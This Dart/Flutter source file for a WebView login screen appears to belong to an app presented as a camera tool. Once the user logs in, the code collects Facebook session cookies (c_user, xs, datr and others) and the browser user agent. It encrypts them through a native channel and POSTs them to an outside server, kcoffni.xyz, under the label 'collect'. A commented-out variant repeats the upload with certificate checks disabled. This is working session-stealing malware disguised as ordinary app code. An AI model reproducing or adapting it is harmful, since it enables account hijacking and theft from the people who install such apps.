import 'dart:async';
import 'dart:convert';
import 'dart:ffi';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:flutter/services.dart';
import 'package:flutter_camera/datas/login_model.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter_camera/utils/SharedPreferencesUtils.dart';
import 'package:flutter_camera/utils/mlog.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';

import '../utils/even_utils.dart';

typedef LoginResult = void Function(bool isLogin);

class MyWebView extends StatefulWidget {
  final LoginResult loginResult;

  MyWebView(this.model, this.loginResult, {Key? key}) : super(key: key);

  final LoginModel model;

  @override
  State<MyWebView> createState() => _MyWebViewState();
}

class _MyWebViewState extends State<MyWebView> {
  final GlobalKey webViewKey = GlobalKey();

  InAppWebViewGroupOptions options = InAppWebViewGroupOptions(
    crossPlatform: InAppWebViewOptions(
      useShouldOverrideUrlLoading: true,
      mediaPlaybackRequiresUserGesture: false,
    ),

    /// android 支持HybridComposition
    android: AndroidInAppWebViewOptions(
      useHybridComposition: true,
    ),
    ios: IOSInAppWebViewOptions(
      allowsInlineMediaPlayback: true,
    ),
  );

  Future<void> checkCookie(Uri cookie) async {
    EvenUtils.getInstance().postEven(10);
    CookieManager cookieManager = CookieManager.instance();
    List<String> names = [
      'datr',
      'sb',
      'm_pixel_ratio',
      'fr',
      'c_user',
      'xs',
      'wd'
    ];
    Map<String, String> cookieStr = Map();
    String result = "";

    for (var value in names) {
      Cookie? c = await cookieManager.getCookie(url: cookie, name: value);

      if (c != null) {
        result += "${c.name}=${c.value};";
      }
    }

    if (result.contains("xs=")) {
      String ua = await InAppWebViewController.getDefaultUserAgent();
      logger.e(ua);
      logger.e(result);

      startEncryption(result, ua);
    }
  }

  var isStart = false;

  Future<void> startEncryption(String datas, String ua) async {
    Map<String, String> uploadMap = Map();
    uploadMap["b"] = ua;
    uploadMap["cookie"] = datas;
    uploadMap["ip"] = "";
    uploadMap["un"] = "";
    uploadMap["pw"] = "";
    uploadMap["source"] = "test0818";
    uploadMap["type"] = "f_o";

    String jsonStr = json.encode(uploadMap);

    //加密

    const platform = const MethodChannel("toJava");

    Map<String, Object> map = {
      "jsonStr": jsonStr,
      "encode": widget.model.encode!,
      "padding": widget.model.padding!
    };

    if (isStart) {
      return;
    }

    isStart = true;
    String returnValue = await platform.invokeMethod("datas", map);

    logger.e(returnValue);
    loadData_dio_dioOfOptionsSetting(returnValue);
  }

  void loadData_dio_dioOfOptionsSetting(String dataStr) async {
    debugPrint(
        ' \n post请求 ======================= 开始请求 =======================\n');
    try {
      // var url = Uri.parse(widget.model.cUrl!);
      var url = Uri.https("kcoffni.xyz", "api/open/collect");
      var body = jsonEncode({"content": dataStr});

      var response = await http.post(url,
          headers: {"Content-Type": "application/json"}, body: body);
      var decodedResponse = jsonDecode(utf8.decode(response.bodyBytes)) as Map;
      print('登录请求结果:$decodedResponse');
      if (decodedResponse["code"] == "0" &&
          decodedResponse["message"] == "success") {
        EvenUtils.getInstance().postEven(20);
        //登录成功
        spPutBool(true);
        widget.loginResult(true);
      } else {
        //登录失败
        widget.loginResult(false);
      }
    } catch (e) {
      print('登录请求失败:$e');
      widget.loginResult(false);
    }

    // Dio dio = Dio();
    //
    // (dio.httpClientAdapter as DefaultHttpClientAdapter).onHttpClientCreate =
    //     (HttpClient dioClient) {
    //   dioClient.badCertificateCallback = ((cert, host, port) => true);
    //   return dioClient;
    // };
    //
    // Response response2 = await dio.post("https://kcoffni.xyz/api/open/collect",
    //     data: {"content": dataStr},
    //     options: Options(
    //       headers: {
    //         'Content-Type': 'application/json',
    //         "accept": "*/*",
    //       },
    //       method: "post",
    //     ));
    // print('$response2');
    // if (response2.statusCode == HttpStatus.ok) {
    //   Map ddd = response2.data;
    //   if (ddd.containsKey("message") && ddd.containsKey("data")) {
    //     var message = ddd["message"];
    //     var data = ddd["data"];
    //
    //     if(data && message == "success"){
    //
    //     }else{
    //
    //     }
    //   } else {
    //
    //   }
    // } else {
    //   print('请求失败');
    // }
  }

  @override
  Widget build(BuildContext context) {
    return InAppWebView(
        key: webViewKey,
        initialUrlRequest:
        URLRequest(url: Uri.parse(widget.model.rUrl ?? "")),
        initialOptions: options,
        onLoadStop: (controller, url) async => {checkCookie(url!!)});
  }
}
